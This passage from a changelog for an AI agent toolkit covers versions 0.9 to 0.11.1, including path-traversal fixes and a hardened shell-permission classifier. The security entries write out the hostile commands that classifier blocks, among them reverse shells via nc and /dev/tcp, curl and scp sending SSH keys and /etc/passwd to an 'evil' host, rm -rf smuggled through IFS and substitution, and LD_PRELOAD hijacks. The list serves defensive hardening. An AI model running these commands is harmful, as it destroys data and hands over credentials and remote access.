* **F6** — `references/30-vibecode-master.md` §8 is now
  "REFINE — canonical envelope" with the full in-scope / out-of-scope
  list (previously REFINE was only mentioned in passing in §2 / §7).
  Old §8 (Verify = RRI in reverse) renumbered to §9; old §9
  (Integration with the agentic runtime) renumbered to §10.

### Fixed (LOW)

* **F2 / F2b / F3** — `CLAUDE.md` "24 slash commands" → "26",
  "39-probe conformance audit" → "47-probe", and `/vibe-refine` +
  `/vibe-module` are now listed under Lifecycle.
* **F4** — Agent frontmatter `version: 0.7.0` bumped to `0.11.1` for
  all 5 cards (`coordinator`, `scout`, `builder`, `qa`, `security`).

### Added (closes audit gaps M4 + M6 + M7 + P4 + P5)

* **M4** — New `docs` scaffold preset (Pattern D) at
  `assets/scaffolds/docs/` — Nextra-powered MDX docs site with
  sidebar + global search + i18n (vi/en).  9-preset table → 10 presets.
* **M6 + M7** — New `references/34-style-tokens.md` enumerating 6 font
  pairings (FP-01..FP-06), 6 color psychologies (CP-01..CP-06), and 6
  copy formulas (CF-01..CF-06) — port of master v5 Phụ Lục B / C / D.
  Programmatic access via `methodology.FONT_PAIRINGS`,
  `COLOR_PSYCHOLOGY`, `COPY_PATTERNS`, and `lookup_style_token(id)`.
* **P4** — `assets/templates/vision.md` "Proposed stack" table is now
  pre-filled per project type (port of master v5 Phụ Lục A).  Style
  direction section references canonical FP-/CP- IDs.
* **P5** — New `assets/rri-question-bank.json` enumerating 8 project
  types (landing/saas/dashboard/blog/docs/portfolio/ecommerce/
  enterprise-module) × 5 personas — port of master v5 Phụ Lục E plus
  extrapolation for the 4 types master v5 left as "(...)".  Loader
  `methodology.load_rri_questions(project_type)`.

### Added (conformance probes)

* **#45 `45_docs_scaffold_pattern_d`** — verifies `docs` preset is
  registered + bootable.
* **#46 `46_style_tokens_canonical`** — verifies `references/34` and
  `methodology.FONT_PAIRINGS / COLOR_PSYCHOLOGY / COPY_PATTERNS` are in
  sync (6/6/6 entries).
* **#47 `47_rri_question_bank`** — verifies bank file + loader return
  ≥ 10 questions for `saas`.

Conformance audit total: **47 probes** (v0.11.0: 44).  Threshold 100 %
passes after this patch on a clean extraction of skill bundle alone.

### v0.11.1 verdict

100 % v5 master spec parity verified — all 7 audit MISSING + 5 PARTIAL
items closed.  Cycle-2 review report: `auto-review-v011-vs-v5-cycle2.md`.


## [0.10.6] — 2026-04-25 (Post-v0.10.5 audit cleanup)

Addresses findings from the user-run `v0.10.5 AUDIT REPORT`:

### Fixed (P3)

* **`claw-code-pack/README.md` line 15** still said
  `canonical version string (0.10.3)` after the v0.10.5 sed run — the sed
  pattern only swapped `0.10.4 → 0.10.5`, missing the older drift.  Now
  reads `(0.10.6)`.
* **Test-count clarification** — `USAGE_GUIDE.md` / `CLAUDE.md` now
  explicitly state: "360 tests (full suite, run từ repo root) vs 17
  bundled `tests/` đại diện cho smoke-test sau khi extract".  Previously a
  user running `pytest tests/` inside an extracted zip saw only the
  bundled subset and was confused by the docs' `360/360`.

### Added (P2 defense-in-depth against the audit's false-positive)

* **`validate_release.py` new step `[5/5] Zip contents`** — after the
  existing source-tree checks, the validator now also opens every
  `dist/*v<canonical>*.zip` and fails if it finds `__pycache__`,
  `.pyc`, `.pytest_cache`, `.vibecode/`, or stray `denials.*` inside.
  This closes the "audit-after-extract-then-test-populated-the-tree"
  false positive path.
* **`tests/test_version_sync.py::test_shipped_zips_are_clean`** — a
  pytest regression that performs the same zip-contents scan.  Skipped
  if no zip is built yet, so developers can run it pre-package.
* **Stale-version list expanded** — `test_usage_guide_version_match`
  now also flags `v0.10.5` as stale in the USAGE_GUIDE header.

### Verification

The v0.10.5 zips were already clean on the build host
(`unzip -l | grep -E "…junk…"` → no matches) — the audit's P2 finding
was a false positive from scanning an extracted+populated tree, not the
shipped zip.  The new validator + regression test make the difference
explicit and lock it down.

### Unchanged

* Permission engine: 95+ patterns, 47 bypass regression tests.
* Conformance audit: 39/39 @ 100 % parity.
* No API changes.

## [0.10.5] — 2026-04-25 (Post-v0.10.4 audit follow-up)

Closes every issue raised in the user-run `v0.10.4 AUDIT REPORT`:

### Fixed (P2)

* **`claw-code-pack/CLAUDE.md` release gate** stale at `pytest → 301/301` —
  now `360/360` to match the v0.10.6 suite.
* **`claw-code-pack/README.md` body** still mentioned `canonical version
  string (0.10.4)` — bumped to `0.10.5`, and the install snippet uses the
  new zip names.
* **Zip hygiene regression** — the v0.10.4 build accidentally shipped
  `__pycache__/`, `.pytest_cache/`, and `.vibecode/runtime/` leftovers in
  some environments.  The build script now runs an aggressive clean
  (`find -name __pycache__ -o -name .pytest_cache -o -name .vibecode
  -o -name "*.pyc" -o -name denials.json -o -name denials.lock`) before
  `zip` and `validate_release.py` now fails on any of those being present.

### Fixed (P3)

* **`QUICKSTART.md`** 5 stale `v0.10.3` references bumped to `v0.10.6`.
* **Permission — `rm -r -f` (separate flags)** previously classified as
  `mutation`.  Added `(^|[\s;&|`])rm\b(?=[^\n;&|]*\s-[a-zA-Z]*[rR]\b)
  (?=[^\n;&|]*\s-[a-zA-Z]*[fF]\b)` + long-form twin (`--recursive`
  / `--force`).  Covers `rm -r -f /`, `rm -r -f -v /`, `rm --force
  --recursive /`.
* **Permission — reverse shell** (`nc -e`, `nc -c`, `ncat -e`,
  `bash -i >& /dev/tcp/…/…`, bidir `exec 5<>/dev/tcp/…`, `socat
  EXEC:/bin/bash`, scripted `python -c 'socket.socket…connect((…))'`)
  now all blocked with dedicated reasons.
* **Permission — data exfiltration** (`curl -d @/etc/passwd`, `curl
  --data-binary @/root/.ssh/id_rsa`, `curl -T /etc/shadow`, `wget
  --post-file=/etc/passwd`, `scp /etc/passwd user@evil:…`, `rsync
  /root/.ssh/ user@evil:…`) now blocked.  The path allowlist is
  intentionally narrow (`/etc/`, `/root/`, `~/.ssh`, `~/.aws`,
  `/var/log/`) — benign `curl -d 'name=x' https://api.example.com`
  still passes.

### Added

* **17 new permission-bypass regression tests** covering the 3 follow-up
  classes (5 × rm-separate-flags, 6 × reverse-shell, 6 × data-exfil).
  Total suite: **360 tests** (v0.10.4: 341; v0.10.3: 311).
* **`tools/validate_release.py` bundled** inside the skill zip at
  `vibecodekit-hybrid-ultra/tools/validate_release.py` so downstream forks
  can re-run the same pre-packaging hygiene check without cloning the
  repo.
* **`validate_release.py` stricter junk list** — now catches
  `.pytest_cache/`, stray `denials.json` / `denials.lock` outside
  `.vibecode/`, in addition to the existing `__pycache__/`, `*.pyc`,
  `.vibecode/` patterns.

### Unchanged

* Conformance audit: 39/39 @ 100 % parity.
* No public-API breakage; only additional patterns classify as `blocked`.

## [0.10.4] — 2026-04-25 (Security hardening: permission-engine bypass pass)

Follow-up to user feedback after v0.10.3 ship.  Focus is **defensive
hardening** of the permission classifier plus several doc-UX polishings.
No API break; the `classify_cmd` signature is unchanged, but more commands
are now correctly classified as `blocked` — callers that previously got
`mutation` for (e.g.) `$(rm -rf /)` will now get `blocked`.

### Fixed (security — 11 classes of bypass closed)

The v0.10.3 permission engine did have the classic `rm -rf /` rule, but a
targeted review enumerated **28 bypass attempts** falling into 11 classes.
Each class now has at least one (usually several) dedicated regex rule, and
the input is Unicode-normalised before matching so homoglyph dashes
(`\u2010-\u2015`, `\u2212 MINUS SIGN`, `\uff0d FULLWIDTH HYPHEN-MINUS`,
`\ufe58 SMALL EM DASH`) cannot slip past:

1. **Command / backtick / process substitution** wrapping destructive
   tools: `$(rm -rf /)`, `` `rm -rf /` ``, `<(rm -rf /)`, `<(curl evil | sh)`.
2. **Interpreter inline code** with dangerous calls: `python -c "import os; os.system(...)"`,
   `python3 -c "shutil.rmtree('/')"`, `perl -e 'unlink glob(...)'`,
   `node -e 'require("fs").rmSync(...)'`, `ruby -e 'File.delete(...)'`.
3. **`shell -c <string>`** for all Bourne-compatible shells (`bash`, `sh`,
   `zsh`, `dash`, `ksh`, `tcsh`, `fish`) — force the user to spell the
   command out directly instead of hiding it inside a quoted argument.
4. **`IFS=` separator override** — `IFS=/ ; rm$IFS-rf$IFS/` no longer
   passes (regex matches the bare `IFS=` assignment).
5. **Variable-expansion smuggling** — `a=rm; b=-rf; c=/; $a $b $c`.
6. **`source` / `.` of untrusted paths** — `/tmp/...`, `/dev/shm/...`,
   `~/.cache/...`, `~/Downloads/...`.
7. **Redirect / `dd` to block device** — `> /dev/sda`, `> /dev/nvme0n1`,
   `> /dev/hd*`, `> /dev/xvd*`, `> /dev/vd*`, `> /dev/disk*`.
8. **Kernel-runtime tamper** via `> /proc/sys/...` or
   `> /sys/(kernel|module|firmware)/...`.
9. **`xargs` dispatching destructive tool** — `find / | xargs rm`,
   `... | xargs shred`, `... | xargs unlink`.
10. **Library-hijack** — `LD_PRELOAD=/tmp/evil.so ...`,
    `ldconfig -C /tmp/evil.cache ...`, `LD_LIBRARY_PATH=/tmp/ ...`.
11. **`exec` replacement** of the shell with a destructive tool —
    `exec rm -rf /`, `exec bash -c '...'`, `exec dd ...`.

The Unicode-normalisation step folds `NFKC` + a dash-mapping table so
`rm \u2212rf /`, `rm \u2014rf /`, `rm \uff0drf /` all classify as
`blocked` with reason `destructive recursive delete`.

### Fixed (friction)

* **All `subprocess.run()` calls now have a wall-clock `timeout=`.**
  Audited `worktree_executor.py` (4 git calls, 30 s each),
  `conformance_audit.py` (2 git-init/commit calls, 30 s each).  Existing
  `hook_interceptor.run`, `task_runtime` bash step, `tool_executor` bash
  step, MCP stdio handshake, and integration-test helpers already had
  per-call timeouts.  A hung `git` binary or a broken hook can no longer
  freeze the runtime indefinitely.

* **`QUICKSTART.md`** stale `v0.10.2` references (4 places — sample zip
  names in "Cài đặt 3 bước" + "Windows" FAQ) bumped to `v0.10.3`.

### Added

* **30 permission-engine bypass regression tests**
  (`tests/test_permission_bypass_vectors.py`) — one class per numbered
  regex family, plus a positive-sanity test so benign commands
  (`ls -la`, `npm test`, `pytest tests/`, `git status`) still classify
  correctly.  Total suite: 341 tests (v0.10.3: 311).

* **`USAGE_GUIDE.md` mermaid flowchart** of the 8-step VIBECODE workflow
  with swimlanes for Homeowner / Contractor / Builder and the feedback
  arrow `VERIFY -.-> BUILD` on FAIL.  ASCII fallback retained for viewers
  that cannot render Mermaid.

* **`USAGE_GUIDE.md` 5-minute pointer** — callout right under the header
  directing readers to `QUICKSTART.md` first if they only have 5 minutes.

* **`SKILL.md` version-origin callout** — explicit note distinguishing
  *"originally introduced in v0.8 / v0.9"* (historical origin of each
  subsystem) from *"current runtime is v0.10.4"* (actual shipping
  version).  Removes the reader-confusion reported in the feedback where
  v0.8-dated rows made the kit look unmaintained.

### Unchanged

* Conformance audit (39/39 probes @ 100 % parity) — security hardening
  lives in the permission classifier, not in the audited subsystems.
* Bundled docs: `VERSION`, `QUICKSTART.md`, `USAGE_GUIDE.md`, `CHANGELOG.md`,
  and `tests/` remain inside both zips.

## [0.10.3] — 2026-04-25 (UX, Windows, docs sync + 2 self-audit passes)

User-reported feedback pass + 2 self-audit iterations.  Closes 3 P1 bugs
from the original report (version drift + Windows crash) and ships 4 UX
improvements (quickstart, HTML dashboard, integration tests, SBERT alias).
Self-audit #1 found 3 issues (1 P1 silent semantic downgrade + 2 P2 UX).
Self-audit #2 found 5 distribution-hygiene gaps reported by the user
(`__init__.py` version stale, update-package README stale, CLAUDE.md
release-gate count stale, QUICKSTART not bundled, integration tests
not bundled) + 3 API improvements.  Everything is fixed in this tag.

Tests: **311 pass** (v0.10.2: 284; +27 — 8 e2e + 3 UX + 15 version-sync + 1 public API).
Audit: **39 / 39 probes @ 100 %** parity (unchanged).
Pre-packaging validation: `tools/validate_release.py` exit 0.

### Added (feedback 8.1 + 8.2)
* **`VERSION` file bundled** in both skill zip and update-package zip;
  `vibecodekit.__version__` now reads from this file (single source of
  truth), with `_FALLBACK_VERSION` as safety net for partial copies.
* **`QUICKSTART.md` bundled** in both zips (was at repo root only).
* **`USAGE_GUIDE.md` bundled** in both zips — 1090-line walkthrough with
  ChatGPT / Codex CLI / Claude-Code usage, RRI-T / RRI-UX / VN-check
  templates, MCP examples, CLI cheatsheet.  Updated content for v0.10.3:
  `StdioSession.request()/.notify()` public, `vibe dashboard --html`,
  sbert-now-raises behaviour, Windows file lock + `VIBECODE_STRICT_LOCK`,
  pre-packaging validator recipe.
* **`tests/test_end_to_end_install.py` bundled** in skill zip so devs
  can audit the install surface from their own installation.
* **`StdioSession.request()` + `.notify()` public API** — thin wrappers
  around `_request` / `_notify` for callers that need to invoke MCP
  methods not yet covered by a typed helper (e.g. `logging/setLevel`,
  `resources/list`, vendor extensions).  `_request` still works for
  backwards compatibility.
* **`tools/validate_release.py`** — pre-packaging checker verifies
  (1) version sync across 9 files, (2) required files present,
  (3) no `__pycache__` / `.pyc` / `.vibecode/` junk.  Exits 1 with
  human-readable findings on any mismatch.  Run this before `zip`.

### Fixed (feedback 8.1)
* **P1 — `__init__.py` version stale** at `0.7.0`.  Now `0.10.3`, reads
  from `VERSION` file, docstring rewritten for v0.10.3 subsystems.
* **P1 — `update-package/README.md` version stale** at `v0.7` with
  wrong zip name and slash-command count.  Rewritten for v0.10.3 with
  21 commands + correct zip name + release-gate callout.
* **P1 — `CLAUDE.md` release gate** said `pytest → 284/284` (v0.10.2).
  Updated to `301/301`.
* **P1 — QUICKSTART.md not shipped in zips** (was only at repo root).
  Now present in both `skill/` and `claw-code-pack/`.
* **P1 — `test_end_to_end_install.py` not shipped in zip**.  Now under
  `skill/.../tests/` with path resolution that works from both repo-root
  and bundled layout.

### Fixed (self-audit #1)
* **P1 — `memory_hierarchy.get_backend('sbert')` silently downgraded to
  hash-256** when `sentence-transformers` was not installed.  Users got
  a degraded semantic search without any warning.  Now raises
  `ValueError` with a clear install hint.  Unknown names also raise.
  The ``name is None`` path (resolving persisted config) still falls
  back silently — that is the documented contract.
* **P2 — `vibe dashboard --html <path>`** leaked a `FileNotFoundError`
  traceback when the target directory didn't exist.  Now auto-creates
  the parent directory (``mkdir -p``) and surfaces permission errors as
  clean JSON (`{"error": ..., "path": ..., "detail": ...}` + exit 1).
* **P2 — `_platform_lock.file_lock`** silently proceeded with no lock
  on Windows when `msvcrt.locking` failed after retry.  Added
  `VIBECODE_STRICT_LOCK=1` opt-in that raises `RuntimeError` on lock
  failure, giving production deployments a way to detect silent races.

### Fixed (original user report)
* **P1 — `.claw.json` version drift.**  Update-package shipped
  `"version": "0.9.0"` while the rest of the kit was 0.10.2.  Bumped in
  lock-step with `VERSION`; added to the pre-packaging sanity script.
* **P1 — `CLAUDE.md` stale v0.7 content.**  Rewritten for v0.10.3:
  lists all 21 slash commands (was 12), 33 lifecycle hook events (was
  18-pattern audit), 3-tier memory, approval JSON contract, release gate
  with all 4 quality probes.
* **P1 — Windows crash on `task_runtime` import.**  Advisory file
  locking used `fcntl` directly in `_locked_index` / `_locked_notifications`
  with an `if _HAS_FCNTL` guard — import itself was fine, but the NO-OP
  fallback meant concurrent writers silently raced.  Added
  `_platform_lock.file_lock()` which uses `fcntl.flock` on POSIX and
  `msvcrt.locking` on Windows.  Both `task_runtime.py` and
  `denial_store.py` now go through this helper.

### Added
* **`QUICKSTART.md`** — 5-minute onboarding path with a "who are you?"
  decision tree (Homeowner / Contractor / Builder × ChatGPT / Codex /
  Claude-Code).  No more "read 960-line guide first".
* **`tests/test_end_to_end_install.py`** — 8 integration tests that
  exercise the *install surface* (audit, sample plan, permission,
  MCP inproc, approval, memory, VN checklist, platform lock).
  Complements the 39 unit-level runtime probes.
* **`vibe dashboard --html <path>`** — writes a single self-contained
  HTML snapshot (no external assets, no network).  User preview before
  the full web UI ships in v0.11.
* **Embedding backend alias** — `vibe config set-backend sentence-transformers`
  now works (aliased to `sbert`); the backend auto-registers lazily if
  the `sentence-transformers` package is importable, otherwise falls
  back to `hash-256` with a clear error.  Added `list_backends()` helper.

### Changed
* `memory_hierarchy.get_backend()` and `set_default_backend()` now
  resolve aliases (`st`, `sentence-transformers`) before lookup; behaviour
  is backwards-compatible (previous `sbert` name still works).
* `mcp_client.initialize()` and `selfcheck.serverInfo.version` bumped
  to `0.10.3`.
* `.claw.json.version` is now sourced from a single file (`VERSION`);
  the packaging script rejects mismatches.

### Deferred to v0.11
* Full web GUI dashboard (WebSocket + React) — `--html` is a static
  interim solution.
* `sentence-transformers` integration test (the package is ~200 MB and
  downloads a model on first use; we document the opt-in but don't ship
  it in the default test matrix).

---

## [0.10.2] — 2026-04-25 (auto-review hardening)

Auto-review of v0.10.1 found three P1 correctness / robustness bugs and
one P2 side-effect leak.  All four are fixed in v0.10.2.  No public API
removed; no new subsystem added.

Tests: **284 pass** (v0.10.1: 277; +7 new).
Audit: **39 / 39 probes @ 100 %** parity (unchanged).

### Fixed
* **P1 — `StdioSession._recv` no longer deadlocks on a hung server.**
  The previous implementation used `stdout.readline()` which blocks
  indefinitely waiting for a newline, ignoring the session timeout.
  `_recv` now uses `selectors.DefaultSelector` to enforce the deadline
  at every iteration and assembles bytes into a line buffer so partial
  reads are safe.  A server that accepts `initialize` and then sleeps
  forever now raises `StdioSessionError("timeout after Xs waiting for
  response")` instead of hanging.
* **P1 — `StdioSession` drains stderr in a background thread.**  With
  `stderr=subprocess.PIPE` and no reader, a server that writes more
  than ~64 KB to stderr (eg. chatty logging) blocks on `write(stderr)`
  and can never deliver its response, causing the client to deadlock
  too.  v0.10.2 spawns a daemon drainer thread at `open()` time that
  copies stderr into a bounded ring buffer (default 64 KB), which is
  exposed via `StdioSession.stderr_tail()` for post-mortem inspection.
* **P1 — `methodology.evaluate_rri_t` / `evaluate_rri_ux` treat
  missing dimensions as a gate failure.**  The previous implementation
  filtered out dimensions with zero entries before checking the 70 %
  and 85 % gates, which meant a user could omit a whole dimension (eg.
  D4 "Localization" in RRI-T or U4 "Viewport" in RRI-UX) and still
  get `gate=PASS`.  Both evaluators now add Gate #0: every dimension
  must be exercised by at least one entry.  The response payload
  gains a `missing_dimensions` field.
* **P2 — `_probe_config_persistence` restores a pre-existing
  `VIBECODE_CONFIG_HOME` env var.**  Previously the probe popped the
  variable unconditionally in `finally`, which clobbered the user's
  value when the audit was run inside a session that had already
  configured its own config-home.  The probe now captures the prior
  value and restores it.

### Added
* `StdioSession.stderr_tail()` — bounded (64 KB default, tunable via
  the `STDERR_TAIL_BYTES` class attribute) byte ring exposing the
  most recent stderr output from the MCP server for post-mortem
  inspection.
* `methodology.evaluate_rri_t / evaluate_rri_ux` now return
  `missing_dimensions: List[str]` alongside `per_dimension`, so
  callers can distinguish "dimension covered and failed" from
  "dimension not covered at all".
* `tests/test_v10_2_hardening.py` — 7 new regression tests (hang
  timeout, stderr flood, missing-dimension gate for RRI-T/UX,
  happy-path still passes, probe 38 env restore both branches).

### Changed
* `StdioSession` now uses **binary** subprocess pipes (`text=False`)
  with `BufferedReader.read1()` to avoid `TextIOWrapper` hiding bytes
  from `select()`.  Decoding is done explicitly with `errors="replace"`.
* `StdioSession.close()` now closes stdin/stdout/stderr pipes
  explicitly to prevent fd leaks across repeated open / close cycles.

### Security
No security-relevant changes.

## [0.10.1] — 2026-04-25 (methodology runners + full MCP handshake)

Closes all five roadmap items deferred by the v0.10 auto-review: makes
the methodology layer **machine-executable**, makes the MCP client a
full protocol client (not a one-shot), persists user config, and fixes
a hex false-positive in the hook secret scrubber.

Tests: **277 pass** (v0.10.0: 255; +22 new).
Audit: **39 / 39 probes @ 100 %** parity (v0.10.0: 36 / 36; +3 new
probes: 37 methodology runners, 38 config persistence, 39 MCP stdio
full handshake).

### Added

- `vibecodekit.methodology` — new module:
    - `evaluate_rri_t(path)` — scores a JSONL of
      `{id, dimension, result, priority, persona}` against the
      `references/31-rri-t-testing.md` release gate (every D ≥ 70 %,
      at least 5 / 7 D ≥ 85 %, 0 P0 FAIL).
    - `evaluate_rri_ux(path)` — same for
      `references/32-rri-ux-critique.md` (FLOW %, 0 P0 BROKEN).
    - `evaluate_vn_checklist(flags)` — 12-point Vietnamese checklist
      derived from the RRI-UX §9 rules (NFKD, address cascade, VND
      formatting, CCCD digits, DD/MM/YYYY, phone +84, longest-label
      layout, collation, spell-out, lunar holidays, UTF-8, explicit
      LTR).
    - `set_embedding_backend(name)` / `get_embedding_backend()` — persist
      the preferred memory-retrieval backend in `~/.vibecode/config.json`
      (override via `VIBECODE_CONFIG_HOME`).
- `vibecodekit.mcp_client.StdioSession` — new class providing a
  persistent JSON-RPC-over-stdio session with the **full** MCP
  handshake: `initialize` → `notifications/initialized` → any number
  of `tools/list` / `tools/call` → clean shutdown.  Exposes
  `open()` / `close()` and context-manager protocol.
- `vibecodekit.mcp_client.list_tools(root, name)` — public API for
  discovering a server's catalogue over the real protocol.
- `vibecodekit.mcp_client.register_server(..., handshake=True)` — makes
  subsequent `call_tool` / `list_tools` use the handshake path; default
  stays `handshake=False` for backwards compatibility.
- `vibecodekit.mcp_servers.selfcheck` — the bundled reference server
  now speaks full MCP when invoked as
  `python -m vibecodekit.mcp_servers.selfcheck` (was inproc-only).
  Implements `initialize`, `notifications/initialized`, `tools/list`,
  `tools/call`, `shutdown`.
- CLI: `vibe rri-t <path>`, `vibe rri-ux <path>`, `vibe vn-check
  --flags-json '{…}'`, `vibe config {show, set-backend, get}`,
  `vibe mcp tools <server>`, `vibe mcp register ... --handshake`.
- Conformance probes (new):
    - **37** `methodology_runners` — exercises RRI-T, RRI-UX, and VN
      checklist (happy + P0-FAIL / P0-BROKEN cases).
    - **38** `config_persistence` — writes + reads backend through
      a temporary config home and verifies `memory_hierarchy.get_backend(None)`
      resolves to the persisted value.
    - **39** `mcp_stdio_full_handshake` — real subprocess spawn of the
      bundled `selfcheck` server, full initialize + tools/list +
      tools/call roundtrip.

### Fixed

- **P3** `hook_interceptor._scrub_str` over-redacted 40-hex git commit
  SHAs via the generic `\b[a-f0-9]{40,}\b` catch-all.  Raised the lower
  bound to **48 hex** chars so SHA-1 sized strings (git SHAs, HMAC-SHA1)
  pass through but SHA-256-sized secrets (Slack webhooks, Google keys)
  are still scrubbed.  Regression:
  `test_hook_interceptor_keeps_git_sha`,
  `test_hook_interceptor_still_scrubs_long_hex`.

### Changed

- `memory_hierarchy.get_backend(None)` now honours the persisted
  `embedding_backend` in `~/.vibecode/config.json` before falling back
  to the in-process default.  Invalid / unknown persisted values fall
  through to the default rather than raising.

### Unchanged / still green

- 18 Claude-Code architectural patterns
- 12 v0.8 / v0.9 runtime subsystems
- RRI family + VIBECODE-MASTER references / templates / slash
  commands (probes 31-36)
- Runtime probes 01-30 still green.


## [0.10.0] — 2026-04-25 (RRI + VIBECODE-MASTER methodology integration)

v0.10 layers the **VIBECODE-MASTER** 3-actor, 8-step authoring
pipeline and the **RRI family** (RRI + RRI-T + RRI-UX + RRI-UI) on top
of the v0.9 "Full Agentic OS" runtime, and fixes 4 bugs surfaced by
auto-review against the new methodology inputs.

Tests: **255 pass** (v0.9: 241; +14 regression tests for the new fixes).
Audit: **36 / 36 probes @ 100 %** parity (v0.9: 30 / 30; +6 methodology
probes: 31 RRI, 32 RRI-T, 33 RRI-UX, 34 RRI-UI, 35 VIBECODE-MASTER, 36
methodology-commands).

### Fixed — v0.9 auto-review (4 security / correctness bugs + 1 hardening)

- **P1** `task_runtime.start_local_workflow` `write` step accepted sibling
  paths whose string representation started with the root path prefix
  (e.g. `root=/tmp/a`, `path=/tmp/ab/x` → `str(path).startswith("/tmp/a")`
  = True → write allowed even though `/tmp/ab` is **outside** `/tmp/a`).
  Now uses `Path.relative_to()` which correctly rejects prefix
  confusion.  Regression: `test_local_workflow_write_rejects_prefix_confusion`.
- **P1** `approval_contract.respond / get / wait` accepted arbitrary
  user-supplied `appr_id` without validation, allowing path traversal
  via `..` / absolute paths.  Added `_APPR_ID_RX = ^appr-[A-Za-z0-9_-]{4,64}$`
  with an `InvalidApprovalID` sentinel; public API returns a structured
  error / `None` instead of raising.  Regressions:
  `test_approval_respond_rejects_traversal`,
  `test_approval_get_rejects_traversal`,
  `test_approval_wait_rejects_traversal`.
- **P1** `memory_hierarchy.add_entry` accepted an unsanitised `source`
  argument, permitting writes outside the tier directory (`source =
  "../escape.jsonl"` → writes to `<tier>/../escape.jsonl`).  Now requires
  a safe basename (`[A-Za-z0-9._-]+`) *and* verifies the resolved path
  is still inside the tier with `Path.resolve().relative_to()`.
  Regressions: `test_memory_add_entry_rejects_traversal`,
  `test_memory_add_entry_accepts_safe_name`.
- **P2** Task-runtime public API (`get_task` / `read_task_output` /
  `kill_task` / `drain_notifications`) accepted arbitrary `task_id`
  values used directly in filesystem paths under
  `.vibecode/runtime/tasks/`.  Added `_TASK_ID_RX = ^task-[A-Za-z0-9_-]{4,64}$`
  and a `_is_valid_task_id` guard at every entry point.  Regressions:
  `test_task_id_regex`, plus 4 "rejects traversal" tests.
- **P3** (hardening) `approval_contract.create` used `secrets.token_hex(4)`
  (32-bit space).  Bumped to `token_hex(8)` to match the task-runtime
  width and eliminate collision risk under concurrent UI use.  Regression:
  `test_approval_id_width`.

### Added — Methodology integration (RRI + VIBECODE-MASTER)

v0.10 adds the methodology layer the user attached — four new
references, three new templates, six new slash commands, six new audit
probes.

#### References (new)

| # | File                                       | What                                                           |
|---|--------------------------------------------|----------------------------------------------------------------|
| 29 | `references/29-rri-reverse-interview.md`   | RRI = Reverse Requirements Interview (5 personas × 3 modes)   |
| 30 | `references/30-vibecode-master.md`      | 3 actors (Homeowner / Contractor / Builder), 8-step workflow  |
| 31 | `references/31-rri-t-testing.md`           | RRI-T: 5 testing personas × 7 dimensions × 8 stress axes      |
| 32 | `references/32-rri-ux-critique.md`         | RRI-UX: 5 UX personas × 7 dimensions × 8 Flow Physics axes    |
| 33 | `references/33-rri-ui-design.md`           | RRI-UI: four-phase pipeline combining RRI-UX + RRI-T          |

`references/21-rri-methodology.md` (the v0.7 Role-Responsibility-Interface
model) remains as an internal runtime governance concept; reference 29
explicitly disambiguates the two uses of the "RRI" acronym.

#### Templates (new)

- `assets/templates/rri-matrix.md` — Requirements matrix (REQ- / D- / OQ-)
- `assets/templates/rri-t-test-case.md` — Q→A→R→P→T test format with dimension + stress axes
- `assets/templates/rri-ux-critique.md` — S→V→P→F→I critique with Frequency×Severity matrix
- `assets/templates/vision.md` — Contractor's pre-Blueprint proposal

#### Slash commands (new)

- `/vibe-scan` — read-only repo exploration (step 1)
- `/vibe-vision` — project type + stack + layout proposal (step 3)
- `/vibe-rri` — Requirements interview (step 2)
- `/vibe-rri-t` — Test discovery (during Verify)
- `/vibe-rri-ux` — UX critique (before code)
- `/vibe-rri-ui` — Combined design pipeline (Phases 0-4)

#### Conformance probes (new)

- 31 `rri_reverse_interview` — RRI personas + methodology present
- 32 `rri_t_testing_methodology` — 5 × 7 × 8 + Q→A→R→P→T template
- 33 `rri_ux_critique_methodology` — 5 UX personas + 8 flow axes + S→V→P→F→I
- 34 `rri_ui_design_pipeline` — 5 phases + release gates
- 35 `vibecode_master_workflow` — 8 steps + 3 actors documented
- 36 `methodology_slash_commands` — all 6 commands present in plugin manifest

### Changed

- `SKILL.md` bumped to 0.10.0; description now names the RRI family +
  VIBECODE-MASTER workflow explicitly; `triggers:` now includes all
  6 new commands.
- `assets/plugin-manifest.json` bumped to 0.10.0, 21 commands (was 15).

### Unchanged / still green

- All 18 Claude-Code architectural patterns
- All 12 v0.8 / v0.9 runtime subsystems (background tasks, MCP client,
  cost ledger, hook interceptor, fcntl-locked denial store, follow-up
  re-execute, 3-tier memory, approval contract, all 7 task kinds,
  4-phase DreamTask, MCP stdio roundtrip, structured notifications)
- 30 runtime probes (01-30): 100 % green


## [0.9.0] — 2026-04-25 (100 % Full Agentic OS)

v0.9 closes the four subsystems the v0.8 parity report deferred and brings
the kit to 100 % parity with *Giải phẫu một Agentic Operating System*.
The v0.8 code is frozen after absorbing seven regression fixes found by a
module-by-module self-audit; v0.9 then adds four new subsystems and six new
behaviour probes (audit total 30/30 @ 100 %).

### Fixed — v0.8 self-audit (7 bugs; 2 P0 / 4 P1 / 1 P2)

- **P0-1** `task_runtime.drain_notifications` had an lost-write race: two
  concurrent producers could both read the file, one writer overwriting
  the other.  Now wrapped in `fcntl.flock(LOCK_EX)` via a new
  `_locked_notifications()` context; atomic truncate after drain.
  Verified under 16×25 contention (`test_drain_notifications_no_data_loss_under_contention`).
- **P0-2** `task_runtime._runner` for `local_bash` could overwrite a
  `killed` status with `completed` when the process finished between the
  kill signal and the wait; now checks terminal state before `_finish()`
  and reaps the subprocess with `proc.wait(timeout=5)` to prevent zombies.
- **P1-1** `query_loop.run_plan` did not reset the `RecoveryLedger`
  between turns; a failure on turn N could keep the circuit breaker
  tripped for turn N+1.  Added `ledger.reset()` at the top of every turn.
- **P1-2** Task IDs bumped from `secrets.token_hex(4)` (2³²) to
  `token_hex(8)` (2⁶⁴) to eliminate collisions in high-throughput runs.
- **P1-3** `mcp_client.call_tool` did not bound user-supplied timeouts;
  clamped to `[0.1, 600.0]` seconds and coerced non-numeric values to 10 s.
- **P1-4** `approval_contract.get` only returned the request; updated to
  merge the response (when present) under the `"response"` key so callers
  can treat an approval as a single record.
- **P2-1** Windows guard in `tool_executor.TimeoutExpired` handler:
  `os.killpg` is POSIX-only; now `hasattr(os,'killpg')`-gated.

### Added — Four remaining subsystems (100 % PDF parity)

- **3-tier memory hierarchy** (`memory_hierarchy.py`, Giải phẫu Ch 11):
  User / Project / Team with pluggable embedding backends
  (`HashEmbeddingBackend` default, 256-dim, deterministic, no deps;
  optional `SentenceTransformerBackend`).  Retrieval blends lexical
  overlap with embedding cosine, tier-bumps project > team > user on
  ties, Vietnamese NFKD normalisation so "du an ruff" matches
  "dự án dùng ruff".  CLI `vibe memory {retrieve|add|stats}`.
- **Approval / elicitation contract** (`approval_contract.py`, §10.4):
  JSON schema with `kind` ∈ {permission, diff, elicitation, notification},
